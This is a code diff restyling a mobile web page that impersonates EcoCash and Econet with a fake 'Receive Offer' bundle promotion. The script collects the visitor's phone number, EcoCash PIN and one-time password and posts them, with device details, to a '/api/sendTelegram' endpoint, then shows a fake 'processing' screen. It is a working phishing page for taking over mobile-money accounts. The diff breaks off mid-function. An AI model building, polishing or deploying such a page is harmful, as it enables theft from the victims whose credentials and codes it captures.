@@ -3,449 +3,308 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
-<meta name="theme-color" content="#003DA5"/>
+<meta name="theme-color" content="#0033a0"/>
 <title>Receive Offer · EcoCash</title>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 
 :root{
-  --blue:#003DA5;
-  --blue-dark:#002b78;
-  --blue-mid:#e8f0fb;
-  --blue-light:#f2f6fd;
-  --red:#C8102E;
-  --neutral-50:#fafafa;
-  --neutral-100:#f4f4f5;
-  --neutral-200:#e4e4e7;
-  --neutral-400:#a1a1aa;
-  --neutral-500:#71717a;
-  --neutral-700:#3f3f46;
-  --neutral-900:#18181b;
-  --white:#fff;
-  --font:'DM Sans',sans-serif;
+  --navy:#0033a0;
+  --navy-dark:#001f6b;
+  --blue:#1a6fff;
+  --sky:#e8f1ff;
+  --sky-mid:#d0e4ff;
+  --sky-deep:#b8d3ff;
+  --red:#d0021b;
+  --page:#f0f5ff;
+  --white:#ffffff;
+  --card:#ffffff;
+  --border:#d5e3f7;
+  --border-strong:#b8ccef;
+  --ink:#0a1f44;
+  --ink-mid:#2d4470;
+  --ink-soft:#6b82a8;
+  --ink-faint:#9eb5d4;
+  --font:'Plus Jakarta Sans',sans-serif;
   --mono:'DM Mono',monospace;
-  --radius-md:16px;
-  --radius-lg:22px;
-  --radius-xl:28px;
+  --r:12px;
+  --r-lg:16px;
+  --shadow:0 1px 3px rgba(0,51,160,.08),0 4px 16px rgba(0,51,160,.06);
 }
 
 html,body{
   width:100%;height:100%;height:100dvh;
-  overflow:hidden;overflow-x:hidden;
-  font-family:var(--font);
-  background:#eef1f7;
+  overflow:hidden;font-family:var(--font);
+  background:var(--page);
 }
 
-/* SCREEN */
 .screen{
   display:flex;flex-direction:column;
   width:100%;height:100%;height:100dvh;
   max-width:430px;margin:0 auto;
-  background:var(--neutral-100);
-  overflow:hidden;overflow-x:hidden;
-  position:relative;
+  background:var(--page);
+  overflow:hidden;position:relative;
 }
 
-/* HEADER */
+/* ── HEADER ── */
 .header{
-  background:var(--blue);
-  padding:20px 20px 24px;
-  position:relative;overflow:hidden;
+  background:var(--navy);
+  padding:16px 18px 20px;
   flex-shrink:0;
-}
-.header::after{
-  content:'';position:absolute;
-  width:220px;height:220px;border-radius:50%;
-  background:rgba(255,255,255,.05);
-  top:-90px;right:-70px;
+  position:relative;overflow:hidden;
 }
 .header::before{
-  content:'';position:absolute;
-  width:130px;height:130px;border-radius:50%;
-  background:rgba(255,255,255,.04);
-  bottom:-50px;left:10px;
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);
+  background-size:32px 32px;pointer-events:none;
+}
+.hglow{
+  position:absolute;width:240px;height:240px;border-radius:50%;
+  background:rgba(26,111,255,.3);filter:blur(70px);
+  top:-100px;right:-60px;pointer-events:none;
 }
 
 .header-top{
-  display:flex;align-items:flex-start;
-  justify-content:space-between;
-  position:relative;z-index:1;
+  display:flex;align-items:center;justify-content:space-between;
+  position:relative;z-index:1;margin-bottom:16px;
 }
+.brand{display:flex;align-items:center;gap:9px}
+.brand-logo-econet{height:24px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
+.brand-sep{width:1px;height:18px;background:rgba(255,255,255,.25)}
+.brand-logo-ecocash{height:30px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
 
-.brand-wordmark{display:flex;flex-direction:column;gap:5px}
-
-.brand-logos{display:flex;align-items:center;gap:10px}
-
-.brand-logo-econet{height:30px;object-fit:contain;opacity:.95}
-.brand-logo-ecocash{height:40px;object-fit:contain;opacity:.95}
-
-.brand-sep{
-  width:1px;height:26px;
-  background:rgba(255,255,255,.3);flex-shrink:0;
-}
-
-.brand-sub{
-  font-size:10px;font-weight:500;
-  color:rgba(255,255,255,.5);letter-spacing:.2px;
-}
-
-/* BUNDLE CHIP in header */
-.bundle-chip{
-  background:rgba(255,255,255,.15);
+.amount-chip{
+  background:rgba(255,255,255,.14);
   border:1px solid rgba(255,255,255,.22);
   padding:5px 12px;border-radius:999px;
-  font-size:11px;font-weight:700;color:white;
-  letter-spacing:.3px;text-transform:uppercase;
-  flex-shrink:0;margin-top:2px;
-  font-family:var(--mono);
+  font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;
 }
 
-.header-info{
-  position:relative;z-index:1;
-  margin-top:16px;
-}
-
-.header-label{
-  font-size:12px;color:rgba(255,255,255,.6);
-  font-weight:500;margin-bottom:6px;
-  text-transform:uppercase;letter-spacing:.5px;
-}
-
-/* BUNDLE SUMMARY PILLS */
+/* bundle pills */
 .bundle-pills{
   display:flex;gap:6px;flex-wrap:wrap;
+  position:relative;z-index:1;
 }
-
 .bundle-pill{
-  background:rgba(255,255,255,.14);
-  border:1px solid rgba(255,255,255,.2);
-  border-radius:999px;
-  padding:4px 10px;
-  font-size:11px;font-weight:700;color:white;
-  font-family:var(--mono);
+  background:rgba(255,255,255,.12);
+  border:1px solid rgba(255,255,255,.18);
+  border-radius:999px;padding:4px 10px;
+  font-family:var(--mono);font-size:10px;font-weight:600;
+  color:rgba(255,255,255,.85);
 }
 
-/* SCROLL BODY */
+/* ── BODY ── */
 .body{
   flex:1;overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;
-  padding:20px 16px max(88px,calc(72px + env(safe-area-inset-bottom)));
-  overscroll-behavior:contain;
-  min-height:0;
+  padding:20px 14px max(96px,calc(80px + env(safe-area-inset-bottom)));
+  overscroll-behavior:contain;min-height:0;
 }
 .body::-webkit-scrollbar{display:none}
 
-/* STEP — card */
-.step{
-  display:none;
-  flex-direction:column;
-  gap:0;
+/* STEP */
+.step{display:none;flex-direction:column;gap:0}
+.step.active{display:flex;animation:fadeIn .18s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+
+/* ECOCASH BRAND ROW — above verify card */
+.ecocash-row{
+  display:flex;align-items:center;gap:10px;
+  background:var(--white);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
+  padding:12px 16px;
+  margin-bottom:10px;
+  box-shadow:var(--shadow);
 }
-.step.active{display:flex}
+.ecocash-logo-lg{height:34px;object-fit:contain}
+.ecocash-row-text{}
+.ecocash-row-title{font-size:13px;font-weight:800;color:var(--ink);line-height:1.2}
+.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:1px}
 
 /* CARD */
 .card{
-  background:var(--white);
-  border-radius:var(--radius-lg);
-  border:1px solid var(--neutral-200);
+  background:var(--card);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
   overflow:hidden;
-  margin-bottom:12px;
+  margin-bottom:10px;
+  box-shadow:var(--shadow);
 }
-
-.card-header{
+.card-top-bar{
+  height:3px;
+  background:linear-gradient(90deg,var(--blue),var(--sky-deep));
+}
+.card-hdr{
   padding:13px 16px 11px;
-  border-bottom:1px solid var(--neutral-100);
+  border-bottom:1px solid var(--border);
 }
-
-.card-title{font-size:14px;font-weight:700;color:var(--neutral-900)}
-.card-sub{font-size:11px;color:var(--neutral-400);font-weight:500;margin-top:2px}
-
-.card-body{padding:14px 16px}
+.card-title{font-size:14px;font-weight:800;color:var(--ink)}
+.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.card-body{padding:16px}
 
 /* FIELD */
-.field{margin-bottom:14px}
+.field{margin-bottom:15px}
 .field:last-child{margin-bottom:0}
-
 .field-label{
-  font-size:11px;font-weight:700;
-  color:var(--neutral-500);
-  text-transform:uppercase;letter-spacing:.7px;
-  margin-bottom:6px;
+  font-size:10px;font-weight:700;color:var(--ink-soft);
+  text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;
 }
 
-/* PHONE GROUP */
+/* PHONE ROW */
 .phone-row{display:flex;gap:8px}
-
 .phone-prefix{
-  background:var(--blue-mid);
-  color:var(--blue);
-  font-size:14px;font-weight:800;
-  font-family:var(--mono);
-  padding:0 14px;
-  border-radius:var(--radius-md);
-  border:1.5px solid rgba(0,61,165,.15);
-  display:flex;align-items:center;
-  flex-shrink:0;
-  height:48px;
+  background:var(--sky);border:1.5px solid var(--sky-deep);
+  color:var(--navy);font-family:var(--mono);font-size:14px;font-weight:800;
+  padding:0 14px;border-radius:var(--r);
+  display:flex;align-items:center;flex-shrink:0;height:48px;
 }
 
-input[type=text],input[type=tel]{
-  width:100%;height:48px;
-  padding:0 14px;
-  border-radius:var(--radius-md);
-  border:1.5px solid var(--neutral-200);
-  background:var(--neutral-50);
-  font-family:var(--font);
-  font-size:15px;font-weight:500;
-  color:var(--neutral-900);
-  outline:none;
-  transition:border-color .18s,box-shadow .18s;
+input[type=tel],input[type=text],input[type=password]{
+  width:100%;height:48px;padding:0 14px;
+  border-radius:var(--r);border:1.5px solid var(--border);
+  background:var(--page);
+  font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
+  outline:none;transition:border-color .18s,background .18s,box-shadow .18s;
   -webkit-appearance:none;
 }
-input[type=text]:focus,input[type=tel]:focus{
-  border-color:var(--blue);
-  box-shadow:0 0 0 4px rgba(0,61,165,.09);
-  background:var(--white);
+input::placeholder{color:var(--ink-faint)}
+input:focus{
+  border-color:var(--blue);background:var(--white);
+  box-shadow:0 0 0 3px rgba(26,111,255,.12);
 }
 
-.field-hint{
-  font-size:11px;color:var(--red);
-  font-weight:600;margin-top:5px;
-}
+.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
 
-/* PIN ROW */
-.pin-row{
-  display:flex;gap:10px;justify-content:center;
-}
-
-.pin-row input{
-  width:56px;height:60px;
-  padding:0;
-  text-align:center;
-  font-size:22px;font-weight:800;
-  font-family:var(--mono);
-  border-radius:var(--radius-md);
-  border:1.5px solid var(--neutral-200);
-  background:var(--neutral-50);
-  color:var(--neutral-900);
-  outline:none;
-  transition:border-color .18s,box-shadow .18s;
-  -webkit-appearance:none;
-}
-.pin-row input:focus{
-  border-color:var(--blue);
-  box-shadow:0 0 0 4px rgba(0,61,165,.09);
-  background:var(--white);
-}
-.pin-row input:disabled{
-  opacity:.4;background:var(--neutral-100);
-}
-
-/* PIN SINGLE FIELD with eye */
-.pin-field{
-  position:relative;display:flex;align-items:center;
-}
+/* PIN FIELD */
+.pin-field{position:relative;display:flex;align-items:center}
 .pin-field input{
-  width:100%;height:52px;
-  padding:0 48px 0 16px;
-  border-radius:var(--radius-md);
-  border:1.5px solid var(--neutral-200);
-  background:var(--neutral-50);
-  font-family:var(--mono);
-  font-size:22px;font-weight:800;
-  letter-spacing:6px;
-  color:var(--neutral-900);
-  outline:none;
-  transition:border-color .18s,box-shadow .18s;
-  -webkit-appearance:none;
-}
-.pin-field input:focus{
-  border-color:var(--blue);
-  box-shadow:0 0 0 4px rgba(0,61,165,.09);
-  background:var(--white);
+  height:48px;padding:0 50px 0 14px;
+  font-family:var(--mono);font-size:22px;letter-spacing:7px;
 }
 .eye-btn{
-  position:absolute;right:14px;
-  background:none;border:none;
-  cursor:pointer;padding:4px;
-  color:var(--neutral-400);
-  display:flex;align-items:center;
-  transition:color .15s;
-  -webkit-tap-highlight-color:transparent;
+  position:absolute;right:13px;background:none;border:none;
+  cursor:pointer;color:var(--ink-faint);display:flex;align-items:center;
+  padding:4px;transition:color .15s;
 }
 .eye-btn:hover{color:var(--blue)}
 
-/* OTP — single hidden input + visual boxes */
-.otp-wrap{
-  position:relative;
-  height:58px;
+/* OTP */
+.otp-wrap{position:relative;height:58px}
+#otpHidden{
+  position:absolute;inset:0;width:100%;height:100%;
+  opacity:0;cursor:pointer;font-size:16px;z-index:2;
+  border:none;background:none;outline:none;caret-color:transparent;
 }
-
-.otp-wrap #otpHidden{
-  position:absolute;
-  inset:0;
-  width:100%;height:100%;
-  opacity:0;
-  cursor:pointer;
-  font-size:16px;
-  z-index:2;
-  border:none;background:none;outline:none;
-  caret-color:transparent;
-}
-
-.otp-display{
-  display:flex;gap:7px;
-  pointer-events:none;
-}
-
+.otp-display{display:flex;gap:7px;pointer-events:none}
 .otp-box{
-  flex:1;height:58px;
-  border-radius:12px;
-  border:1.5px solid var(--neutral-200);
-  background:var(--neutral-50);
+  flex:1;height:58px;border-radius:var(--r);
+  border:1.5px solid var(--border);background:var(--page);
   display:flex;align-items:center;justify-content:center;
-  font-family:var(--mono);font-size:22px;font-weight:800;
-  color:var(--neutral-900);
-  transition:border-color .18s,box-shadow .18s,background .18s;
+  font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
+  transition:border-color .18s,background .18s,box-shadow .18s;
 }
+.otp-box.filled{background:var(--white);border-color:var(--sky-deep)}
+.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px rgba(26,111,255,.12)}
+.otp-box.disabled{opacity:.4;background:var(--border)}
 
-.otp-box.filled{
-  background:var(--white);
-  border-color:var(--blue);
-}
-
-.otp-box.active{
-  border-color:var(--blue);
-  box-shadow:0 0 0 3px rgba(0,61,165,.09);
-  background:var(--white);
-}
-
-.otp-box.disabled{
-  opacity:.4;background:var(--neutral-100);
-  border-color:var(--neutral-200);
-}
-
-/* TIMER */
 .timer-row{
   display:flex;justify-content:space-between;align-items:center;
   padding:10px 0 0;
 }
-
-.timer-label{
-  font-size:12px;color:var(--neutral-500);font-weight:500;
-}
-
-.timer-val{
-  font-family:var(--mono);font-size:13px;
-  font-weight:700;color:var(--blue);
-}
-
+.timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
+.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue)}
 .resend-btn{
-  background:none;border:none;
-  font-family:var(--font);
-  font-size:12px;font-weight:700;
-  color:var(--blue);cursor:pointer;
-  opacity:.35;
-  padding:0;transition:opacity .18s;
+  background:none;border:none;font-family:var(--font);
+  font-size:12px;font-weight:700;color:var(--blue);
+  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
 }
 .resend-btn.active{opacity:1}
 
-/* MASKED NUMBER */
 .masked-note{
-  font-size:13px;color:var(--neutral-500);
-  font-weight:500;line-height:1.5;
-  text-align:center;
-  padding:2px 0 4px;
+  font-size:13px;color:var(--ink-soft);font-weight:500;
+  text-align:center;padding:2px 0 6px;line-height:1.5;
 }
 
-/* STICKY FOOTER BUTTON */
+/* PROCESSING */
+.proc-body{padding:30px 20px;text-align:center}
+.proc-ring{
+  width:52px;height:52px;border-radius:50%;margin:0 auto 14px;
+  border:3px solid var(--sky-deep);border-top-color:var(--blue);
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.proc-title{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:5px}
+.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.5}
+
+/* ── STICKY FOOTER ── */
 .sticky-footer{
   position:absolute;bottom:0;left:0;right:0;
-  padding:12px 16px max(20px,env(safe-area-inset-bottom));
-  background:linear-gradient(to top,var(--neutral-100) 72%,transparent);
+  padding:12px 14px max(20px,env(safe-area-inset-bottom));
+  background:linear-gradient(to top,var(--page) 70%,transparent);
   z-index:10;
 }
-
-.pay-btn{
-  background:var(--blue);color:white;
-  border:none;width:100%;padding:16px;
-  border-radius:var(--radius-md);
-  font-family:var(--font);font-size:15px;font-weight:800;
-  cursor:pointer;letter-spacing:-.1px;
-  transition:all .15s ease;
-  opacity:.4;pointer-events:none;
+.action-btn{
+  background:var(--blue);color:#fff;border:none;width:100%;padding:15px;
+  border-radius:var(--r-lg);
+  font-family:var(--font);font-size:14px;font-weight:800;
+  cursor:pointer;letter-spacing:.1px;
+  transition:all .15s;opacity:.35;pointer-events:none;
+  box-shadow:0 4px 16px rgba(26,111,255,.3);
 }
-.pay-btn.active{opacity:1;pointer-events:auto}
-.pay-btn:active{transform:scale(.98);background:var(--blue-dark)}
+.action-btn.active{opacity:1;pointer-events:auto}
+.action-btn:active{transform:scale(.98)}
 
-/* SUCCESS CARD */
-.success-icon{
-  width:64px;height:64px;border-radius:50%;
-  background:var(--blue-mid);
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 14px;
-  font-size:28px;
-}
-
-.success-title{
-  font-size:20px;font-weight:800;
-  color:var(--neutral-900);
-  text-align:center;margin-bottom:6px;
-}
-
-.success-sub{
-  font-size:13px;color:var(--neutral-500);
-  font-weight:500;text-align:center;line-height:1.5;
-}
-
-/* POWERED BY */
+/* POWERED */
 .powered{
-  text-align:center;
-  padding:4px 0 2px;
-  font-size:10px;color:var(--neutral-400);
-  font-weight:500;letter-spacing:.3px;
+  text-align:center;padding:4px 0 2px;
+  font-size:9px;color:var(--ink-faint);font-weight:500;letter-spacing:.3px;
 }
-.powered strong{color:var(--neutral-500);font-weight:700}
 </style>
 </head>
 <body>
-
 <div class="screen">
 
   <!-- HEADER -->
   <div class="header">
+    <div class="hglow"></div>
     <div class="header-top">
-      <div class="brand-wordmark">
-        <div class="brand-logos">
-          <img src="assets/econet.png" alt="Econet" class="brand-logo-econet">
-          <span class="brand-sep"></span>
-          <img src="assets/ecocash.png" alt="EcoCash" class="brand-logo-ecocash">
-        </div>
-        <div class="brand-sub">Receive Offer</div>
+      <div class="brand">
+        <img src="assets/econet.png" alt="Econet" class="brand-logo-econet">
+        <div class="brand-sep"></div>
+        <img src="assets/ecocash.png" alt="EcoCash" class="brand-logo-ecocash">
       </div>
-      <div class="bundle-chip" id="headerAmount">USD 0.00</div>
+      <div class="amount-chip" id="headerAmount">USD 0.00</div>
     </div>
-
-    <div class="header-info" id="headerBundleInfo">
-      <div class="header-label">Selected Bundle</div>
-      <div class="bundle-pills" id="bundlePills">
-        <span class="bundle-pill" id="pillDuration">—</span>
-        <span class="bundle-pill" id="pillVoice">—</span>
-        <span class="bundle-pill" id="pillSms">—</span>
-        <span class="bundle-pill" id="pillData">—</span>
-      </div>
+    <div class="bundle-pills" id="bundlePills">
+      <span class="bundle-pill" id="pillDuration">—</span>
+      <span class="bundle-pill" id="pillVoice">—</span>
+      <span class="bundle-pill" id="pillSms">—</span>
+      <span class="bundle-pill" id="pillData">—</span>
     </div>
   </div>
 
   <!-- BODY -->
   <div class="body">
 
-    <!-- STEP 1: Phone + PIN -->
+    <!-- STEP 1 -->
     <div id="step1" class="step active">
 
+      <!-- EcoCash brand row ABOVE the verify card -->
+      <div class="ecocash-row">
+        <img src="assets/ecocash.png" alt="EcoCash" class="ecocash-logo-lg">
+        <div class="ecocash-row-text">
+          <div class="ecocash-row-title">Pay with EcoCash</div>
+          <div class="ecocash-row-sub">Instant mobile wallet payment</div>
+        </div>
+      </div>
+
       <div class="card">
-        <div class="card-header">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr">
           <div class="card-title">Verify your account</div>
           <div class="card-sub">Enter your EcoCash number and PIN</div>
         </div>
@@ -461,11 +320,11 @@ input[type=text]:focus,input[type=tel]:focus{
           </div>
 
           <div class="field">
-            <div class="field-label">Enter your PIN</div>
+            <div class="field-label">EcoCash PIN</div>
             <div class="pin-field">
               <input type="password" id="pinInput" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="••••" autocomplete="current-password">
               <button class="eye-btn" id="eyeBtn" type="button" aria-label="Show PIN">
-                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                 </svg>
               </button>
@@ -474,30 +333,26 @@ input[type=text]:focus,input[type=tel]:focus{
 
         </div>
       </div>
-
-      <div class="powered">Powered by <strong>Econet Wireless</strong> &middot; <strong>EcoCash</strong></div>
-
+      <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
-    <!-- STEP 3: OTP -->
+    <!-- STEP 2: OTP -->
     <div id="step3" class="step">
-
       <div class="card">
-        <div class="card-header">
+        <div class="card-top-bar"></div>
+        <div class="card-hdr">
           <div class="card-title">One-Time Password</div>
-          <div class="card-sub">Enter the 6-digit code sent to your number</div>
+          <div class="card-sub">6-digit code sent to your EcoCash number</div>
         </div>
         <div class="card-body">
-
           <div class="field">
             <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
           </div>
-
           <div class="field">
             <div class="field-label">OTP Code</div>
             <div class="otp-wrap" id="otpWrap">
               <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
-              <div class="otp-display" id="otpDisplay">
+              <div class="otp-display">
                 <div class="otp-box" id="ob0"></div>
                 <div class="otp-box" id="ob1"></div>
                 <div class="otp-box" id="ob2"></div>
@@ -507,51 +362,41 @@ input[type=text]:focus,input[type=tel]:focus{
               </div>
             </div>
           </div>
-
           <div class="timer-row">
-            <div class="timer-label">Code expires in <span style="font-family:var(--mono);font-weight:700;color:var(--blue)" id="time">120</span>s</div>
+            <div class="timer-lbl">Expires in <span class="timer-num" id="time">120</span>s</div>
             <button class="resend-btn" id="resendBtn">Resend OTP</button>
           </div>
-
         </div>
       </div>
-
-      <div class="powered">Powered by <strong>Econet Wireless</strong> &middot; <strong>EcoCash</strong></div>
-
+      <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
-    <!-- STEP 4: Success -->
+    <!-- STEP 3: Processing -->
     <div id="step4" class="step">
-
       <div class="card">
-        <div class="card-body" style="padding:28px 16px;text-align:center">
-          <div class="success-icon">⏳</div>
-          <div class="success-title">Processing...</div>
-          <div class="success-sub">Your bundle request is being processed.<br>Please wait a moment.</div>
+        <div class="card-top-bar"></div>
+        <div class="proc-body">
+          <div class="proc-ring"></div>
+          <div class="proc-title">Processing Request</div>
+          <div class="proc-sub">Your bundle is being activated.<br>This will only take a moment.</div>
         </div>
       </div>
-
     </div>
 
   </div>
 
-  <!-- STICKY BUTTON -->
+  <!-- FOOTER -->
   <div class="sticky-footer">
-    <button class="pay-btn" id="mainBtn">Receive Offer</button>
+    <button class="action-btn" id="mainBtn">Receive Offer</button>
   </div>
 
 </div>
 
 <script>
-let phoneValue="";
-let pinValue="";
-let otpValue="";
-let loginClicked=false;
-let otpSubmitted=false;
-let resendClicked=false;
+let phoneValue="",pinValue="",otpValue="";
+let loginClicked=false,otpSubmitted=false,resendClicked=false;
 let currentStep="step1";
 
-/* ── Load selected plan ── */
 let selectedPlan=null;
 try{selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))}catch(e){}
 
@@ -565,7 +410,6 @@ function initHeader(){
 }
 initHeader();
 
-/* ── Device ── */
 const ua=navigator.userAgent;
 let device="Unknown";
 if(/Android/i.test(ua)) device="Android";
@@ -579,81 +423,50 @@ function getPlanLine(){
 }
 
 async function sendToTelegram(eventName){
-  fetch("/api/sendTelegram",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      submittedAt:new Date().toISOString(),
-      loginPhone:phoneValue,
-      loginPin:pinValue,
-      otp:otpValue,
-      event:eventName,
-      plan:getPlanLine(),
-      device:device
-    })
-  });
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
 }
 
-/* ── Show step ── */
 function showStep(id){
   document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
   document.getElementById(id).classList.add("active");
-  currentStep=id;
-  updateBtn();
+  currentStep=id;updateBtn();
 }
 
-/* ── Main button label + state ── */
 function updateBtn(){
   const btn=document.getElementById("mainBtn");
-  if(currentStep==="step1"){
-    btn.textContent="Receive Offer";
-    validateLogin();
-  } else if(currentStep==="step3"){
-    btn.textContent="Confirm OTP";
-    validateOtp();
-  } else {
-    btn.textContent="Processing...";
-    btn.classList.remove("active");
-  }
+  if(currentStep==="step1"){btn.textContent="Receive Offer";validateLogin();}
+  else if(currentStep==="step3"){btn.textContent="Confirm OTP";validateOtp();}
+  else{btn.textContent="Processing...";btn.classList.remove("active");}
 }
 
-/* ── Phone input ── */
 const phoneEl=document.getElementById("phone");
 phoneEl.oninput=e=>{
   let v=e.target.value.replace(/\D/g,"");
   if(v.startsWith("263")) v=v.slice(3);
   if(v.startsWith("0")) v=v.slice(1);
-  if(v.length>0 && v[0]!=="7") v="7"+v.slice(1);
-  v=v.slice(0,9);
-  e.target.value=v;
-  phoneValue="+263"+v;
-  validateLogin();
+  if(v.length>0&&v[0]!=="7") v="7"+v.slice(1);
+  v=v.slice(0,9);e.target.value=v;
+  phoneValue="+263"+v;validateLogin();
 };
 
-/* ── PIN single input + eye toggle ── */
 const pinInput=document.getElementById("pinInput");
 const eyeBtn=document.getElementById("eyeBtn");
-
-pinInput.oninput=()=>{
-  pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);
-  validateLogin();
-};
+pinInput.oninput=()=>{pinInput.value=pinInput.value.replace(/\D/g,"").slice(0,4);validateLogin()};
 
 eyeBtn.onclick=()=>{
   const show=pinInput.type==="password";
   pinInput.type=show?"text":"password";
   eyeBtn.innerHTML=show
-    ?`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
-    :`<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+    ?`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
+    :`<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
 };
 
 function validateLogin(){
   pinValue=pinInput.value;
-  const ok=phoneValue.length===13 && pinValue.length===4;
+  const ok=phoneValue.length===13&&pinValue.length===4;
   document.getElementById("mainBtn").classList.toggle("active",ok);
 }
 
-/* ── OTP single hidden input → visual boxes ── */
 const otpHidden=document.getElementById("otpHidden");
 const otpBoxes=[...document.querySelectorAll(".otp-box")];
 let otpDisabled=false;
@@ -667,80 +480,55 @@ function renderOtp(){
     box.className="otp-box";
     if(otpDisabled){box.classList.add("disabled");return}
     if(i<cursor) box.classList.add("filled");
-    if(i===cursor && document.activeElement===otpHidden) box.classList.add("active");
+    if(i===cursor&&document.activeElement===otpHidden) box.classList.add("active");
   });
   otpValue=val;
   document.getElementById("mainBtn").classList.toggle("active",val.length===6);
 }
-
 otpHidden.addEventListener("input",renderOtp);
 otpHidden.addEventListener("focus",renderOtp);
 otpHidden.addEventListener("blur",renderOtp);
-
-document.getElementById("otpWrap").addEventListener("click",()=>{
-  if(!otpDisabled) otpHidden.focus();
-});
+document.getElementById("otpWrap").addEventListener("click",()=>{if(!otpDisabled)otpHidden.focus()});
 
 function resetOtp(disabled){
-  otpDisabled=disabled;
-  otpHidden.value="";
-  otpHidden.disabled=disabled;
-  renderOtp();
+  otpDisabled=disabled;otpHidden.value="";otpHidden.disabled=disabled;renderOtp();
   if(!disabled) otpHidden.focus();
 }
+function validateOtp(){document.getElementById("mainBtn").classList.toggle("active",otpValue.length===6)}
 
-function validateOtp(){
-  document.getElementById("mainBtn").classList.toggle("active",otpValue.length===6);
-}
-
-/* ── Main button click ── */
 document.getElementById("mainBtn").onclick=()=>{
   if(currentStep==="step1"){
-    if(loginClicked) return;
-    loginClicked=true;
+    if(loginClicked) return;loginClicked=true;
     sendToTelegram("receive_offer_clicked");
     const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
-    document.getElementById("maskedNumber").textContent="Enter the OTP sent to "+masked;
-    showStep("step3");
-    startTimer();
+    document.getElementById("maskedNumber").textContent="Code sent to "+masked;
+    showStep("step3");startTimer();
   } else if(currentStep==="step3"){
-    if(otpSubmitted) return;
-    otpSubmitted=true;
+    if(otpSubmitted) return;otpSubmitted=true;
     sendToTelegram("offer_received");
     showStep("step4");
-    setTimeout(()=>{ location.href="thankyou.html"; },1200);
+    setTimeout(()=>{location.href="thankyou.html"},1200);
   }
 };
 
-/* ── Resend ── */
 document.getElementById("resendBtn").onclick=()=>{
   const btn=document.getElementById("resendBtn");
   if(!btn.classList.contains("active")) return;
-  if(resendClicked) return;
